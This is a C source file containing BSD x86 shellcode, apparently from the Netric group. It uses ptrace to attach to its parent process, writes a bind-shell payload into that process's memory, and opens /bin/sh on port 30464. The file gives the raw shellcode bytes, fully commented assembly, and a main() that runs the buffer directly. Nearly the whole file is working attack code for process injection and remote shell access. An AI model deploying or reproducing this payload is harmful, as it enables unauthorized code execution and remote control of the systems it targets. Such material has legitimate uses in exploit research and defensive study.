/* BSD-x86 291 byte ptrace shellcode by eSDee of Netric (www.netric.org) */

char
shellcode[]=
        "\x31\xc0\xb0\x27\xcd\x80\x89\x45"
        "\x04\x31\xc0\x31\xd2\x31\xc9\x50"
        "\x50\xff\x75\x04\xb1\x09\x51\x50"
        "\xb0\x1a\xcd\x80\x39\xc2\x74\x02"
        "\xeb\x5f\x31\xc0\x50\x50\x50\xff"
        "\x75\x04\x50\xb0\x07\xcd\x80\x31"
        "\xc0\x50\x89\xea\x83\xc2\x08\x89"
        "\x55\xfc\x52\xff\x75\x04\xb1\x21"
        "\x51\x50\xb0\x1a\xcd\x80\x8b\x55"
        "\x28\x89\x55\xf8\x31\xf6\xeb\x37"
        "\x5e\x31\xc9\x31\xc0\x31\xdb\x8a"
        "\x1e\x53\x46\xb0\x90\x38\xd8\x74"
        "\x11\x52\xff\x75\x04\xb1\x04\x51"
        "\x50\xb0\x1a\xcd\x80\x31\xc0\x42"
        "\xeb\xdf\x31\xc0\x50\x50\xff\x75"
        "\x04\xb1\x0a\x51\x50\xb0\x1a\xcd"
        "\x80\x31\xc0\xb0\x01\xcd\x80\xe8"
        "\xc4\xff\xff\xff"

        /* bindcode starts here */
        "\x31\xc0\x31\xdb"
        "\x31\xc9\x31\xd2\xb0\x61\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x8d\x0c\x24\x51\xcd\x80\xb1\x02"
        "\x31\xc9\x51\x51\x51\x80\xc1\x77"
        "\x66\x51\xb5\x02\x66\x51\x8d\x0c"
        "\x24\xb2\x10\x52\x51\x50\x8d\x0c"
        "\x24\x51\x89\xc2\x31\xc0\xb0\x68"
        "\xcd\x80\xb3\x01\x53\x52\x8d\x0c"
        "\x24\x51\x31\xc0\xb0\x6a\xcd\x80"
        "\x31\xc0\x50\x50\x52\x8d\x0c\x24"
        "\x51\x31\xc9\xb0\x1e\xcd\x80\x89"
        "\xc3\x53\x51\x31\xc0\xb0\x5a\xcd"
        "\x80\x41\x53\x51\x31\xc0\xb0\x5a"
        "\xcd\x80\x41\x53\x51\x31\xc0\xb0"
        "\x5a\xcd\x80\x31\xdb\x53\x68\x6e"
        "\x2f\x73\x68\x68\x2f\x2f\x62\x69"
        "\x89\xe3\x31\xc0\x50\x54\x53\x50"
        "\xb0\x3b\xcd\x80\x31\xc0\xb0\x01"
        "\xcd\x80"
        "\x90"; /* and a NOP to end */

int
main()
{
/*      __asm( "xorl %eax,%eax
                movb $0x27,%al          # SYS_getppid
                int $0x80
                movl %eax,4(%ebp)

                xorl %eax,%eax
                xorl %edx,%edx
                xorl %ecx,%ecx
                pushl %eax
                pushl %eax
                pushl 4(%ebp)           # getppid
                movb $0x9, %cl          # PT_ATTACH
                pushl %ecx
                pushl %eax
                movb $0x1A,%al          # SYS_ptrace
                int $0x80               # ptrace(PT_ATTACH,getppid(),NULL,NULL);
                cmp %eax,%edx
                je PTRACE_WAIT
                jmp EXIT                # failed

                PTRACE_WAIT:
                xorl %eax,%eax
                pushl %eax
                pushl %eax
                pushl %eax
                pushl 4(%ebp)           # getppid
                pushl %eax
                movb $0x07,%al          # SYS_wait4
                int $0x80
                xorl %eax,%eax
                pushl %eax
                movl %ebp,%edx
                addb $8, %edx
                movl %edx, -4(%ebp)
                pushl %edx
                pushl 4(%ebp)           # getppid
                movb $0x21,%cl          # PT_GETREGS
                pushl %ecx
                pushl %eax
                movb $0x1A,%al          # SYS_ptrace
                int $0x80               # ptrace(PT_GETREGS,getppid(),&regs,NULL);
                movl 40(%ebp), %edx
                movl %edx, -8(%ebp)
                xorl %esi,%esi
                jmp GETEIP
                BACK:
                popl %esi

                PTRACE_WRITE:
                xorl %ecx,%ecx
                xorl %eax,%eax
                xorl %ebx,%ebx
                movb (%esi), %ebx
                pushl %ebx
                inc %esi
                movb $0x90, %al
                cmpb %bl, %al           # end of the shellcode
                je PTRACE_DETACH
                pushl %edx
                pushl 4(%ebp)           # getppid
                movb $0x4,%cl
                pushl %ecx
                pushl %eax
                movb $0x1A,%al          # SYS_ptrace
                int $0x80               # ptrace(PT_WRITE_I,getppid(),eip++,getchar);
                xorl %eax,%eax
                inc %edx
                jmp PTRACE_WRITE

                PTRACE_DETACH:
                xorl %eax,%eax
                pushl %eax
                pushl %eax
                pushl 4(%ebp)           # getppid
                movb $0xA, %cl
                pushl %ecx              # PT_DETACH
                pushl %eax
                movb $0x1A,%al          # SYS_ptrace
                int $0x80               # ptrace(PT_DETACH,getppid(),NULL,NULL);
                EXIT:
                xorl %eax,%eax
                movb $0x01, %al         # SYS_exit
                int $0x80

                GETEIP:
                call BACK

                SHELLCODE:              # shellcode by r00tdude (ilja@netric.org)
                xorl    %eax,%eax       # binds /bin/sh on port 30464
                xorl    %ebx,%ebx
                xorl    %ecx,%ecx
                xorl    %edx,%edx
                movb    $0x61,%al
                pushl   %ecx
                movb    $0x6,%cl
                pushl   %ecx
                movb    $0x1,%cl
                pushl   %ecx
                movb    $0x2,%cl
                pushl   %ecx
                leal    (%esp),%ecx
                pushl   %ecx
                int     $0x80
                movb    $0x2,%cl
                xorl    %ecx,%ecx
                pushl   %ecx
                pushl   %ecx
                pushl   %ecx
                addb    $0x77,%cl
                pushw   %cx
                movb    $0x2,%ch
                pushw   %cx
                leal    (%esp),%ecx
                movb    $0x10,%dl
                pushl   %edx
                pushl   %ecx
                pushl   %eax
                leal    (%esp),%ecx
                pushl   %ecx
                movl    %eax,%edx
                xorl    %eax,%eax
                movb    $0x68,%al
                int     $0x80
                movb    $0x1,%bl
                pushl   %ebx
                pushl   %edx
                leal    (%esp),%ecx
                pushl   %ecx
                xorl    %eax,%eax
                movb    $0x6a,%al
                int     $0x80
                xorl    %eax,%eax
                pushl   %eax
                pushl   %eax
                pushl   %edx
                leal    (%esp),%ecx
                pushl   %ecx
                xorl    %ecx,%ecx
                movb    $0x1e,%al
                int     $0x80
                movl    %eax,%ebx
                pushl   %ebx
                pushl   %ecx
                xorl    %eax,%eax
                movb    $0x5a,%al
                int     $0x80
                inc     %ecx
                pushl   %ebx
                pushl   %ecx
                xorl    %eax,%eax
                movb    $0x5a,%al
                int     $0x80
                inc     %ecx
                pushl   %ebx
                pushl   %ecx
                xorl    %eax,%eax
                movb    $0x5a,%al
                int     $0x80
                xorl    %ebx,%ebx
                pushl   %ebx
                pushl   $0x68732f6e
                pushl   $0x69622f2f
                movl    %esp,%ebx
                xorl    %eax,%eax
                pushl   %eax
                pushl   %esp
                pushl   %ebx
                pushl   %eax
                movb     $0x3b,%al
                int     $0x80
                xorl    %eax,%eax
                movb    $0x1,%al
                int     $0x80
                nop");
*/

        void (*funct)();
        (long) funct = &shellcode;
        printf("Length: %d\n", strlen(shellcode));
        funct();
}